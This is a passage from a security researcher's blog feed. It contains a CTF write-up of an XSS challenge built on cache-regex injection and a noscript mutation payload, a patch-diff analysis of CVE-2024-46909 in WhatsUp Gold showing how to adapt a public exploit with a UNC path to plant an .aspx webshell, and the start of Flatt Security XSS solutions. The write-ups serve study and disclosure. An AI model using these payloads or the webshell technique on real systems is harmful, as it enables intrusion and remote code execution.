<p>Start from line [1], the above comment makes it clear <em>Look for embedded serialized file info.</em> . It uses this regex <code class="language-plaintext highlighter-rouge">/^(.*)ENDCI---&gt;/</code> to get the serialized content of the cache file. So I wondered what if I can include an extra <code class="language-plaintext highlighter-rouge">ENDCI---&gt;</code> in my input which will be then stored in the cache file  will it affect the output?</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">&gt;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(.*)ENDCI---&gt;/'</span><span class="p">,</span> <span class="s1">'a:2:{s:6:"expire";i:1734530101;s:7:"headers";a:0:{}}ENDCI---&gt;shirleyINJECTED_ENDCI---&gt;aaaaa'</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>

<span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"expire"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1734530101</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"headers"</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span><span class="no">ENDCI</span><span class="o">---&gt;</span><span class="n">shirleyINJECTED_ENDCI</span><span class="o">---&gt;</span>

<span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"expire"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1734530101</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"headers"</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span><span class="no">ENDCI</span><span class="o">---&gt;</span><span class="n">shirleyINJECTED_</span>
</code></pre></div></div>

<p>And this is how it decides what content to be sent as the cached response.It counts the length of the $match[0] (which contains the serialized data) and everything aside from the serialized data is sent back as the response.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_display</span><span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$cache</span><span class="p">,</span> <span class="k">self</span><span class="o">::</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span>
</code></pre></div></div>

<p>This was a very interesting behaviour because of the greedy regex match, if we are able to inlcude such <code class="language-plaintext highlighter-rouge">ENDCI---&gt;</code> inside the attribute value we can break the context.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"Everything before that gets ignored ENDCI---&gt;&lt;xss payload&gt;"</span><span class="nt">&gt;</span>ssssssssss
</code></pre></div></div>

<p>The cached data which is to be returned by the server will be.</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xss</span> <span class="na">payload</span><span class="nt">&gt;</span>"&gt;ssssssssss
</code></pre></div></div>
<p>As you can see the context break and the browser would happily render our xss payload.</p>

<p>But still I had one doubt on the very next line you can see the serialized data (<code class="language-plaintext highlighter-rouge">$match[1]</code>) is passed to the <code class="language-plaintext highlighter-rouge">unserialized</code> method and though having extra characters at the end will create problems but turns out everything is ok?</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">&gt;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(.*)ENDCI---&gt;/'</span><span class="p">,</span> <span class="s1">'a:2:{s:6:"expire";i:1734530101;s:7:"headers";a:0:{}}ENDCI---&gt;shirley INJECTED_ENDCI---&gt;everything after this will be I
GNORED'</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
<span class="k">Array</span>
<span class="p">(</span>
    <span class="p">[</span><span class="n">expire</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1734530101</span>
    <span class="p">[</span><span class="n">headers</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="k">Array</span>
        <span class="p">(</span>
        <span class="p">)</span>

<span class="p">)</span>
</code></pre></div></div>

<p>The next hurdle was to figure out how to include <code class="language-plaintext highlighter-rouge">---&gt;</code> character in the page. As attempts like this lead to the <code class="language-plaintext highlighter-rouge">&gt;</code> get html encoded</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---&gt;
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"---&amp;gt;"</span>

<span class="err">&lt;</span><span class="na">---</span> <span class="na">a</span> <span class="na">---</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"&amp;lt;----a----&amp;gt;"</span><span class="nt">&gt;</span>

<span class="nt">&lt;aaaa</span> <span class="na">id=</span><span class="s">'---&gt;'</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"&lt;aaaa-id='---&amp;gt;'&gt;"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>I then decided to simply fuzz <code class="language-plaintext highlighter-rouge">--FUZZ&gt;</code> this pattern to see if there are any characters which would allow me to have <code class="language-plaintext highlighter-rouge">---&gt;</code> in output.
Turns out from the result there are a bunch of such characters.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%09
%0D
%20

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"----&gt;"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>Btw if you look carefully there is an extra <code class="language-plaintext highlighter-rouge">-</code> which I failed to notice one first try and was wondering why it wasn‚Äôt working, so thanks to the <code class="language-plaintext highlighter-rouge">str2id</code> method which was responsible for converting space characters to <code class="language-plaintext highlighter-rouge">-</code>.Just need to remove one <code class="language-plaintext highlighter-rouge">-</code> from our input and we are good to go.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--%20&gt;
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"---&gt;"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p><img src="https://gist.github.com/user-attachments/assets/30d0f755-8486-436f-bc11-399efebe3a30" alt="image" /></p>

<p>You can see how it get transformed into</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"expire"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1734589274</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"headers"</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span><span class="no">ENDCI</span><span class="o">---&gt;&lt;!</span><span class="no">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;&lt;</span><span class="n">link</span> <span class="n">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="n">href</span><span class="o">=</span><span class="s2">"/style.css"</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span> <span class="n">background</span><span class="o">=</span><span class="s2">"#483741"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"fire-border"</span><span class="o">&gt;&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">"/index.php"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"top-left"</span><span class="o">&gt;</span><span class="err">‚¨Ö</span> <span class="nc">Go</span> <span class="n">back</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"wrapper"</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="no">ENDCI</span><span class="o">--</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">aaaaaa</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;</span><span class="n">ul</span> <span class="n">class</span><span class="o">=</span><span class="s2">"wall"</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">ul</span><span class="o">&gt;&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"crown"</span><span class="o">&gt;&lt;</span><span class="n">ul</span> <span class="n">class</span><span class="o">=</span><span class="s2">"round"</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">ul</span><span class="o">&gt;&lt;</span><span class="n">ul</span> <span class="n">class</span><span class="o">=</span><span class="s2">"ball"</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">ul</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"fireplace"</span> <span class="n">id</span><span class="o">=</span><span class="s2">"ENDCI---&gt;
</span></code></pre></div></div>
<p><a href="http://localhost:8002/index.php/view?title=ENDCI--%20%3Eaaaaaa">http://localhost:8002/index.php/view?title=ENDCI--%20%3Eaaaaaa</a></p>

<p><img src="https://gist.github.com/user-attachments/assets/427e81af-6166-45ee-9383-ec43ed99da98" alt="image" /></p>

<hr />

<h1 id="mutation-xss-to-bypass-xss_clean">Mutation XSS to bypass <code class="language-plaintext highlighter-rouge">xss_clean</code></h1>

<p>After fuzzing for what tags are allowed I found that it allows noscript,noframes,etc so we can the unfamous noscript mutation vector to bypass this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENDCI-- &gt;aaaa<span class="nt">&lt;noscript&gt;&lt;</span> <span class="nt">a</span> <span class="na">id=</span><span class="s">'&lt;/noscript&gt;&lt;svg/onload=location=name&gt;'</span><span class="nt">&gt;&lt;/noscript&gt;</span>
</code></pre></div></div>

<p>Notice the space  <code class="language-plaintext highlighter-rouge">&lt; a&gt;</code> , while playing with the sanitizer I noticed it was removing  the <code class="language-plaintext highlighter-rouge">id</code> attribrute when I simply put it as <code class="language-plaintext highlighter-rouge">&lt;a</code> but seems with custom elements it doesn‚Äôt validates much and the attributes are allowed. I didn‚Äôt looked into the source of <code class="language-plaintext highlighter-rouge">xss_clean</code> as I didn‚Äôt had time.</p>

<p>You can watch these videos for more details:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/lG7U3fuNw3A?si=1fyZH3nzhe-nsMu-" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<iframe width="560" height="315" src="https://www.youtube.com/embed/gVrdE6g_fa8?si=HsuvpCHjssUx9RGy" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<p>And finally here‚Äôs the alert popup:</p>

<p><a href="https://challenge-1224.intigriti.io/index.php/view?title=ENDCI--%20%3Eaaaa%3Cnoscript%3E%3C%20a%20id%3D%27%3C%2Fnoscript%3E%3Csvg%2Fonload%3Dlocation%3Dname%3E%27%3E%3C%2Fnoscript%3E">https://challenge-1224.intigriti.io/index.php/view?title=ENDCI--%20%3Eaaaa%3Cnoscript%3E%3C%20a%20id%3D%27%3C%2Fnoscript%3E%3Csvg%2Fonload%3Dlocation%3Dname%3E%27%3E%3C%2Fnoscript%3E</a></p>

<p><img src="https://gist.github.com/user-attachments/assets/05821e08-3cf7-4839-8970-975f1ffb4aa2" alt="image" /></p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="ctf" /><category term="xss" /><summary type="html"><![CDATA[This was really an interesting xss challenge by @J0R1AN. I solved this challenge after the challenge deadline was over but still wanted to do a blogpost cause why not :p]]></summary></entry><entry><title type="html">(CVE-2024-46909) Progress Software WhatsUp Gold WriteDataFile Directory Traversal Remote Code Execution Vulnerability</title><link href="http://localhost:4000/2024/12/10/WhatsupGold-WriteDataFile-RCE.html" rel="alternate" type="text/html" title="(CVE-2024-46909) Progress Software WhatsUp Gold WriteDataFile Directory Traversal Remote Code Execution Vulnerability" /><published>2024-12-10T00:00:00+05:30</published><updated>2024-12-10T00:00:00+05:30</updated><id>http://localhost:4000/2024/12/10/WhatsupGold-WriteDataFile-RCE</id><content type="html" xml:base="http://localhost:4000/2024/12/10/WhatsupGold-WriteDataFile-RCE.html"><![CDATA[<p>I haven‚Äôt done any CVE reverse engineer blogposts before but really wanted to do one, so I decided look at something this Advisory <a href="https://www.zerodayinitiative.com/advisories/ZDI-24-1645/">https://www.zerodayinitiative.com/advisories/ZDI-24-1645/</a> looked interesting and I already had some idea about it from a past blogpost from the original finder of the same bug 
@SinSinology,  the vulnerable component name is same so it would be just a bypass of the old bug</p>

<p>Below you can find the original blogpost of the old bug, we have detailed blogpost and the poc too :</p>

<p><a href="https://summoning.team/blog/progress-whatsup-gold-writedatafile-cve-2024-4883-rce/">https://summoning.team/blog/progress-whatsup-gold-writedatafile-cve-2024-4883-rce/</a></p>

<p><a href="https://github.com/sinsinology/CVE-2024-4883">https://github.com/sinsinology/CVE-2024-4883</a></p>

<p>The details looks exactly the same I so quicly downloaded the patched version to do a patch diff <a href="https://www.zerodayinitiative.com/advisories/ZDI-24-1645/">https://www.zerodayinitiative.com/advisories/ZDI-24-1645/</a> . I already had an old version installed so I took a backup of the following two files</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files (x86)\Ipswitch\WhatsUp\NmAPI.exe
C:\Program Files (x86)\Ipswitch\WhatsUp\WUGDataAccess.dll
</code></pre></div></div>

<p>After downloading the latest version and installing it , I exported the source from dotPeek and did a diff using DiffMerge</p>

<p>The declaration of the <code class="language-plaintext highlighter-rouge">WriteDataFile</code> method is in the NmAPI.exe!NmAPI.CoreServices.cs</p>

<p>Here‚Äôs the Diff version of the <code class="language-plaintext highlighter-rouge">WriteDataFile</code> method</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     public void WriteDataFile(EntityDataFileTransfer dataFile)
     {
<span class="gd">-      if (dataFile.FileInfo.DirectoryName.Contains("..") || dataFile.FileInfo.DirectoryName.Contains(":") || dataFile.FileInfo.Name.Contains("..") || dataFile.FileInfo.Name.Contains(":"))
</span><span class="err">
</span><span class="gi">+      if (dataFile.FileInfo.DirectoryName.Contains("..") || dataFile.FileInfo.DirectoryName.Contains(":") || dataFile.FileInfo.Name.Contains("..") || dataFile.FileInfo.Name.Contains(":") || dataFile.FileInfo.Name.Contains&lt;char&gt;('\\') || dataFile.FileInfo.Name.Contains&lt;char&gt;('/') || dataFile.FileInfo.DirectoryName.StartsWith("\\") || dataFile.FileInfo.DirectoryName.StartsWith("/"))
</span><span class="err">
</span>         throw new ArgumentException("Invalid file or directory name");
       string str = Path.Combine(Directory.GetCurrentDirectory(), "Data" + dataFile.FileInfo.DirectoryName);
       string path = Path.Combine(str, dataFile.FileInfo.Name);
<span class="err">
</span><span class="gi">+      if (!Path.GetFullPath(path).StartsWith(Path.GetFullPath(str), StringComparison.OrdinalIgnoreCase))
+        throw new ArgumentException("Invalid directory");
</span>       
       if (File.Exists(path))
       {
         File.SetAttributes(path, FileAttributes.Archive);
</code></pre></div></div>

<p>Initially the if checks for the <code class="language-plaintext highlighter-rouge">dataFile.FileInfo.DirectoryName</code> and <code class="language-plaintext highlighter-rouge">dataFile.FileInfo.Name</code> were added to resolve the old issue CVE-2024-4883 , we can see now they added more checks there</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dataFile</span><span class="p">.</span><span class="n">FileInfo</span><span class="p">.</span><span class="n">Name</span><span class="p">.</span><span class="n">Contains</span><span class="p">&lt;</span><span class="kt">char</span><span class="p">&gt;(</span><span class="sc">'\\'</span><span class="p">)</span>
<span class="n">dataFile</span><span class="p">.</span><span class="n">FileInfo</span><span class="p">.</span><span class="n">Name</span><span class="p">.</span><span class="n">Contains</span><span class="p">&lt;</span><span class="kt">char</span><span class="p">&gt;(</span><span class="sc">'/'</span><span class="p">)</span>

<span class="n">dataFile</span><span class="p">.</span><span class="n">FileInfo</span><span class="p">.</span><span class="n">DirectoryName</span><span class="p">.</span><span class="nf">StartsWith</span><span class="p">(</span><span class="s">"\\"</span><span class="p">)</span>
<span class="n">dataFile</span><span class="p">.</span><span class="n">FileInfo</span><span class="p">.</span><span class="n">DirectoryName</span><span class="p">.</span><span class="nf">StartsWith</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span>
</code></pre></div></div>

<p>Basically they are just checking if the Name and DirectoryName property Contains or StartsWith <code class="language-plaintext highlighter-rouge">//</code> ,<code class="language-plaintext highlighter-rouge">\</code> characters or not.</p>

<p>For Windows <code class="language-plaintext highlighter-rouge">\\</code> is treated as Network Path (UNC Path) , for eg \ServerName\SharedFolder . So I thought the bypass is related to that only , I went with this path of thinking , if C directory where Whatsupgold is installed is being shared then it might be accessible under <code class="language-plaintext highlighter-rouge">\\PC-Name\</code></p>

<p><img src="https://gist.github.com/user-attachments/assets/f27b1a32-b63b-4143-b086-71fb77e2f3bf" alt="image" /></p>

<p>Just an example UNC path which could get pass the if check: <code class="language-plaintext highlighter-rouge">\\Desktop-5i7nkh0\c\Program Files (x86)\Ipswitch\WhatsUp\html\NmConsole</code></p>

<hr />

<p>In the exploit which @SinSinology originaly wrote you can see how the path is specified. All we need to do replace the value for the <code class="language-plaintext highlighter-rouge">webshell_path</code> variable with the UNC one</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="kt">string</span> <span class="n">webshell_path</span> <span class="p">=</span> <span class="s">@"C:\Program Files (x86)\Ipswitch\WhatsUp\html\NmConsole\"</span> <span class="p">+</span> <span class="n">webshell_name</span><span class="p">;</span>

            <span class="n">EntityDataFileTransfer</span> <span class="n">dataFile</span> <span class="p">=</span> <span class="k">new</span> <span class="n">EntityDataFileTransfer</span>
            <span class="p">{</span>
                <span class="n">FileInfo</span> <span class="p">=</span> <span class="k">new</span> <span class="n">EntityFileInfo</span>
                <span class="p">{</span>
                    <span class="n">DirectoryName</span> <span class="p">=</span> <span class="s">"test"</span><span class="p">,</span>
                    <span class="n">Name</span> <span class="p">=</span> <span class="n">webshell_path</span><span class="p">,</span>
                    <span class="n">LastWriteTime</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">Now</span>
                <span class="p">},</span>
                <span class="n">FileContents</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">.</span><span class="nf">ReadAllBytes</span><span class="p">(</span><span class="n">webshell</span><span class="p">)</span>
            <span class="p">};</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"(*) Using write what where primitive, to plant "</span> <span class="p">+</span> <span class="n">webshell_path</span><span class="p">);</span>
            <span class="n">core_client</span><span class="p">.</span><span class="nf">WriteDataFile</span><span class="p">(</span><span class="n">dataFile</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">string</span> <span class="n">webshell_path</span> <span class="p">=</span> <span class="s">@"\\Desktop-5i7nkh0\c\Program Files (x86)\Ipswitch\WhatsUp\html\NmConsole\"</span> <span class="p">+</span> <span class="n">webshell_name</span><span class="p">;</span>
</code></pre></div></div>

<p>Then just Build the Solution and execute the binary. It will write the content pointed out by the  <code class="language-plaintext highlighter-rouge">webshell</code> file and it will be written in the <code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\Ipswitch\WhatsUp\html\NmConsole\</code> on the targetted system.</p>

<p>Thus by visiting the uploaded .aspx file location we can execute arbitrary commands.</p>

<p>A small gif for the exploit in action:</p>

<p><img src="https://gist.github.com/user-attachments/assets/aa9b7906-53d9-4e1a-b673-788d285816fd" alt="518N76pbo5" /></p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="CVE" /><category term="RCE" /><summary type="html"><![CDATA[I haven‚Äôt done any CVE reverse engineer blogposts before but really wanted to do one, so I decided look at something this Advisory https://www.zerodayinitiative.com/advisories/ZDI-24-1645/ looked interesting and I already had some idea about it from a past blogpost from the original finder of the same bug @SinSinology, the vulnerable component name is same so it would be just a bypass of the old bug]]></summary></entry><entry><title type="html">Flatt Security XSS Challenge Solutions</title><link href="http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions.html" rel="alternate" type="text/html" title="Flatt Security XSS Challenge Solutions" /><published>2024-12-07T00:00:00+05:30</published><updated>2024-12-07T00:00:00+05:30</updated><id>http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions</id><content type="html" xml:base="http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions.html"><![CDATA[<p>There were three xss challenges from Flatt Security , which were all really good I really liked the last challenge which was authored by the legend Masato Kinugawa and I managed to solve it too :p</p>

<h1 id="challenge-1-by-hamayanhamayan">Challenge 1 by @hamayanhamayan</h1>

<p>This was the most easiest one from the others.</p>

<p>hamayan\src\index.js</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">createDOMPurify</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">dompurify</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">JSDOM</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsdom</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nb">window</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">JSDOM</span><span class="p">(</span><span class="dl">''</span><span class="p">).</span><span class="nb">window</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">DOMPurify</span> <span class="o">=</span> <span class="nf">createDOMPurify</span><span class="p">(</span><span class="nb">window</span><span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">message</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">message</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="s2">`/?message=Yes%2C%20&lt;b&gt;we%20can&lt;%2Fb&gt;%21`</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="kd">const</span> <span class="nx">sanitized</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span> <span class="c1">// [1]</span>
  <span class="nx">res</span><span class="p">.</span><span class="nf">view</span><span class="p">(</span><span class="dl">"</span><span class="s2">/index.ejs</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">sanitized</span><span class="p">:</span> <span class="nx">sanitized</span> <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

